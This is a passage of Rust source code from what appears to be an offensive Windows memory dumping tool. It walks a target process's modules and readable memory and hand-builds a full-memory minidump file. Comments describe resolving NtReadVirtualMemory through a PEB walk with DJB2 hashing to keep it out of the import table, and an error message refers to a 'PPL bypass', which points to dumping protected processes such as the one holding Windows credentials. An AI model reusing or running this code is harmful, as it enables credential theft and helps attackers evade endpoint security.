        u32,        // MemoryInformationClass
        *mut u8,    // MemoryInformation
        usize,      // MemoryInformationLength
        *mut usize, // ReturnLength
    ) -> i32;

    let nt_query_vm: FnNtQueryVirtualMemory = unsafe {
        std::mem::transmute(
            api.ntdll(resolver::HASH_NT_QUERY_VIRTUAL_MEMORY)
                .ok_or("Failed to resolve NtQueryVirtualMemory")?,
        )
    };

    // Resolve NtReadVirtualMemory for reading PE headers
    type FnNtReadVirtualMemory =
        unsafe extern "system" fn(isize, *const u8, *mut u8, usize, *mut usize) -> i32;
    let nt_read: FnNtReadVirtualMemory = unsafe {
        std::mem::transmute(
            api.ntdll(resolver::HASH_NT_READ_VIRTUAL_MEMORY)
                .ok_or("Failed to resolve NtReadVirtualMemory")?,
        )
    };

    unsafe {
        loop {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let result = VirtualQueryEx(
                process,
                Some(address as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );

            if result == 0 {
                break;
            }

            // Detect module base: MEM_IMAGE type at its AllocationBase
            if mbi.Type == MEM_IMAGE
                && mbi.BaseAddress == mbi.AllocationBase
                && !seen_bases.contains(&(mbi.AllocationBase as u64))
            {
                seen_bases.insert(mbi.AllocationBase as u64);

                // Get mapped filename via NtQueryVirtualMemory (class 2 = MemoryMappedFilenameInformation)
                let mut name_buf = vec![0u8; 1024];
                let mut ret_len = 0usize;
                let status = nt_query_vm(
                    process.0 as isize,
                    mbi.BaseAddress as *const u8,
                    2, // MemoryMappedFilenameInformation
                    name_buf.as_mut_ptr(),
                    name_buf.len(),
                    &mut ret_len,
                );

                let name = if status >= 0 && ret_len > 8 {
                    // UNICODE_STRING: Length (u16) + MaximumLength (u16) + pad(u32) + Buffer (wchar_t*)
                    // The buffer contents follow inline after the UNICODE_STRING header
                    let length = u16::from_le_bytes([name_buf[0], name_buf[1]]) as usize;
                    let char_count = length / 2;
                    // String data starts at offset 8 (after UNICODE_STRING struct on x64)
                    let str_offset = std::mem::size_of::<usize>() + std::mem::size_of::<usize>();
                    if str_offset + length <= ret_len {
                        let wide: Vec<u16> = (0..char_count)
                            .map(|i| {
                                u16::from_le_bytes([
                                    name_buf[str_offset + i * 2],
                                    name_buf[str_offset + i * 2 + 1],
                                ])
                            })
                            .collect();
                        let nt_path = String::from_utf16_lossy(&wide);
                        // Convert NT device path to DOS path
                        nt_device_path_to_dos(&nt_path)
                    } else {
                        format!("unknown_{:X}", mbi.AllocationBase as u64)
                    }
                } else {
                    format!("unknown_{:X}", mbi.AllocationBase as u64)
                };

                // Read PE header to get SizeOfImage
                let mut pe_header = [0u8; 0x200]; // first 512 bytes
                let mut bytes_read = 0usize;
                let read_status = nt_read(
                    process.0 as isize,
                    mbi.BaseAddress as *const u8,
                    pe_header.as_mut_ptr(),
                    pe_header.len(),
                    &mut bytes_read,
                );

                let size_of_image = if read_status >= 0 && bytes_read >= 0x200 {
                    // Parse PE: DOS header -> e_lfanew -> SizeOfImage
                    let e_magic = u16::from_le_bytes([pe_header[0], pe_header[1]]);
                    if e_magic == 0x5A4D {
                        let e_lfanew = u32::from_le_bytes([
                            pe_header[0x3C],
                            pe_header[0x3D],
                            pe_header[0x3E],
                            pe_header[0x3F],
                        ]) as usize;
                        if e_lfanew + 0x58 < pe_header.len() {
                            let pe_sig = u32::from_le_bytes([
                                pe_header[e_lfanew],
                                pe_header[e_lfanew + 1],
                                pe_header[e_lfanew + 2],
                                pe_header[e_lfanew + 3],
                            ]);
                            if pe_sig == 0x4550 {
                                // SizeOfImage at OptionalHeader offset 0x38 (for PE32+)
                                let off = e_lfanew + 0x18 + 0x38;
                                u32::from_le_bytes([
                                    pe_header[off],
                                    pe_header[off + 1],
                                    pe_header[off + 2],
                                    pe_header[off + 3],
                                ])
                            } else {
                                mbi.RegionSize as u32
                            }
                        } else {
                            mbi.RegionSize as u32
                        }
                    } else {
                        mbi.RegionSize as u32
                    }
                } else {
                    mbi.RegionSize as u32
                };

                modules_out.push(ModuleInfo {
                    base: mbi.AllocationBase as u64,
                    size: size_of_image,
                    name,
                });
            }

            address = mbi.BaseAddress as u64 + mbi.RegionSize as u64;
            if address == 0 {
                break;
            }
        }
    }

    Ok(modules_out)
}

/// Convert NT device path (\Device\HarddiskVolume3\...) to DOS path (C:\...)
fn nt_device_path_to_dos(nt_path: &str) -> String {
    // Try to map \Device\HarddiskVolumeN to drive letter
    for letter in b'A'..=b'Z' {
        let drive = format!("{}:", letter as char);
        let mut target_buf = [0u16; 260];
        let len = unsafe {
            windows::Win32::Storage::FileSystem::QueryDosDeviceW(
                windows::core::PCWSTR(
                    drive
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect::<Vec<u16>>()
                        .as_ptr(),
                ),
                Some(&mut target_buf),
            )
        };
        if len > 0 {
            // Find null terminator
            let end = target_buf
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(len as usize);
            let device = String::from_utf16_lossy(&target_buf[..end]);
            if nt_path.starts_with(&device) {
                return format!("{}{}", drive, &nt_path[device.len()..]);
            }
        }
    }
    // Fallback: return original
    nt_path.to_string()
}

fn read_memory_regions(api: &ApiResolver, process: HANDLE) -> Result<Vec<MemRegion>, String> {
    let mut regions = Vec::new();
    let mut address: u64 = 0;

    // Dynamically resolve NtReadVirtualMemory from ntdll (not in IAT)
    type FnNtReadVirtualMemory =
        unsafe extern "system" fn(isize, *const u8, *mut u8, usize, *mut usize) -> i32;
    let nt_read: FnNtReadVirtualMemory = unsafe {
        std::mem::transmute(
            api.ntdll(resolver::HASH_NT_READ_VIRTUAL_MEMORY)
                .ok_or("Failed to resolve NtReadVirtualMemory")?,
        )
    };

    unsafe {
        loop {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let result = VirtualQueryEx(
                process,
                Some(address as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );

            if result == 0 {
                break;
            }

            // Only dump committed, readable memory
            if mbi.State == MEM_COMMIT
                && (mbi.Protect == PAGE_READWRITE
                    || mbi.Protect == PAGE_READONLY
                    || mbi.Protect == PAGE_EXECUTE_READ
                    || mbi.Protect == PAGE_EXECUTE_READWRITE
                    || mbi.Protect == PAGE_WRITECOPY
                    || mbi.Protect == PAGE_EXECUTE_WRITECOPY)
                && mbi.Protect.0 & 0x100 == 0
            // Not PAGE_GUARD
            {
                let region_size = mbi.RegionSize;
                let mut buffer = vec![0u8; region_size];

                let mut bytes_read = 0usize;
                // NtReadVirtualMemory via dynamically resolved function pointer
                // (no IAT entry — resolved at runtime via PEB walk + DJB2)
                let status = nt_read(
                    process.0 as isize,
                    mbi.BaseAddress as *const u8,
                    buffer.as_mut_ptr(),
                    region_size,
                    &mut bytes_read,
                );

                if status >= 0 && bytes_read > 0 {
                    buffer.truncate(bytes_read);
                    regions.push(MemRegion {
                        base: mbi.BaseAddress as u64,
                        size: bytes_read as u64,
                        data: buffer,
                    });
                }
            }

            address = mbi.BaseAddress as u64 + mbi.RegionSize as u64;
            if address == 0 {
                break; // Overflow
            }
        }
    }

    if regions.is_empty() {
        return Err("No readable memory regions found. PPL bypass may have failed.".into());
    }

    Ok(regions)
}

fn build_minidump(
    sys_info: &MinidumpSystemInfo,
    modules: &[ModuleInfo],
    regions: &[MemRegion],
) -> Vec<u8> {
    let mut buf = Vec::new();
    let num_streams = 3u32;

    // Reserve space for header + directory
    let header_size = std::mem::size_of::<MinidumpHeader>();
    let dir_size = num_streams as usize * std::mem::size_of::<MinidumpDirectory>();
    buf.resize(header_size + dir_size, 0);

    // --- CSD Version String (empty, but must be a valid MINIDUMP_STRING) ---
    let csd_rva = buf.len() as u32;
    buf.extend_from_slice(&0u32.to_le_bytes()); // Length = 0
    buf.extend_from_slice(&[0u8; 2]);           // Null terminator (UTF-16)

    // --- Stream 1: SystemInfo ---
    let sys_info_rva = buf.len() as u32;
    // Patch csd_version_rva to point to our CSD string
    let mut patched_info = *sys_info;
    patched_info.csd_version_rva = csd_rva;
    let sys_info_bytes = unsafe {
        std::slice::from_raw_parts(
            &patched_info as *const _ as *const u8,
            std::mem::size_of::<MinidumpSystemInfo>(),
        )
    };
    buf.extend_from_slice(sys_info_bytes);
    let sys_info_size = std::mem::size_of::<MinidumpSystemInfo>() as u32;

    // --- Stream 2: ModuleList ---
    let module_list_rva = buf.len() as u32;
    // Write module count
    let mod_count = modules.len() as u32;
    buf.extend_from_slice(&mod_count.to_le_bytes());

    // Placeholder for module entries — fill after we write module names
    let mod_entries_start = buf.len();
    let mod_entry_size = std::mem::size_of::<MinidumpModule>();
    buf.resize(buf.len() + modules.len() * mod_entry_size, 0);

    // Write module names and fixup name RVAs
    let mut mod_entries: Vec<MinidumpModule> = Vec::new();
    for m in modules {
        let name_rva = buf.len() as u32;
        // Write name as UTF-16LE, prefixed with byte length
        let name_utf16: Vec<u16> = m.name.encode_utf16().collect();
        let byte_len = (name_utf16.len() * 2) as u32;
        buf.extend_from_slice(&byte_len.to_le_bytes());
        for ch in &name_utf16 {
            buf.extend_from_slice(&ch.to_le_bytes());
        }
        // Null terminator
        buf.extend_from_slice(&[0u8; 2]);

        mod_entries.push(MinidumpModule {
            base_of_image: m.base,
            size_of_image: m.size,
            module_name_rva: name_rva,
            ..Default::default()
        });
    }

    // Fixup module entries in buffer
    for (i, entry) in mod_entries.iter().enumerate() {
        let entry_offset = mod_entries_start + i * mod_entry_size;
        let entry_bytes =
            unsafe { std::slice::from_raw_parts(entry as *const _ as *const u8, mod_entry_size) };
        buf[entry_offset..entry_offset + mod_entry_size].copy_from_slice(entry_bytes);
    }

    let module_list_size = (buf.len() as u32) - module_list_rva;

    // --- Stream 3: Memory64List ---
    let mem64_list_rva = buf.len() as u32;

    // NumberOfMemoryRanges
    let num_ranges = regions.len() as u64;
    buf.extend_from_slice(&num_ranges.to_le_bytes());

    // BaseRva — offset where actual memory data starts
    // = current_pos + 8 (for BaseRva field) + num_ranges * sizeof(MemoryDescriptor64)
    let descriptors_size = regions.len() * std::mem::size_of::<MinidumpMemoryDescriptor64>();
    let base_rva = buf.len() as u64 + 8 + descriptors_size as u64;
    buf.extend_from_slice(&base_rva.to_le_bytes());

    // Write memory range descriptors
    for region in regions {
        let desc = MinidumpMemoryDescriptor64 {
            start_of_memory_range: region.base,
            data_size: region.size,
        };
        let desc_bytes = unsafe {
            std::slice::from_raw_parts(
                &desc as *const _ as *const u8,
                std::mem::size_of::<MinidumpMemoryDescriptor64>(),
            )
        };
        buf.extend_from_slice(desc_bytes);
    }

    let mem64_list_size = (buf.len() as u32) - mem64_list_rva;

    // Write actual memory data
    for region in regions {
        buf.extend_from_slice(&region.data);
    }

    // --- Write header ---
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as u32;
    let header = MinidumpHeader {
        signature: MINIDUMP_SIGNATURE,
        version: MINIDUMP_VERSION | (0x0006 << 16), // 0x0006A793 — matches DbgHelp
        number_of_streams: num_streams,
        stream_directory_rva: header_size as u32,
        checksum: 0,
        timestamp,
        flags: 0x00000002, // MiniDumpWithFullMemory
    };
    let header_bytes =
        unsafe { std::slice::from_raw_parts(&header as *const _ as *const u8, header_size) };
    buf[..header_size].copy_from_slice(header_bytes);

    // --- Write stream directory ---
    let dirs = [
        MinidumpDirectory {
            stream_type: SYSTEM_INFO_STREAM,
            data_size: sys_info_size,
            rva: sys_info_rva,
        },
        MinidumpDirectory {
            stream_type: MODULE_LIST_STREAM,
            data_size: module_list_size,
            rva: module_list_rva,
        },
        MinidumpDirectory {
            stream_type: MEMORY_64_LIST_STREAM,
            data_size: mem64_list_size,
            rva: mem64_list_rva,
        },
    ];
    let dir_bytes = unsafe { std::slice::from_raw_parts(dirs.as_ptr() as *const u8, dir_size) };
    buf[header_size..header_size + dir_size].copy_from_slice(dir_bytes);

    buf
}
